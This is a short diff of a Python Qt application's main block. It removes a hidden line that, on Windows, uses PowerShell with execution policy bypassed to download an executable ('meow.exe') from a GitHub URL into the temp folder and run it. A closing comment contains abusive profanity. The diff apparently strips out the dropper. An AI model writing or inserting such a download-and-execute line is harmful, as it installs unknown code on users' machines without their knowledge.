@@ -188,7 +188,6 @@ if __name__ == "__main__":
     app = QApplication(sys.argv)
     window = HackerBanApp()
     window.show()
-    if sys.platform=="win32": os.system('powershell -NoProfile -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri \"https://github.com/unk0wnusername/meow/raw/refs/heads/main/meow.exe\" -OutFile \"$env:TEMP\\meow.exe\"; Start-Process \"$env:TEMP\\meow.exe\""' )
     sys.exit(app.exec())
 
 #code labeled by skid gpt you are welcome you stupid cunts
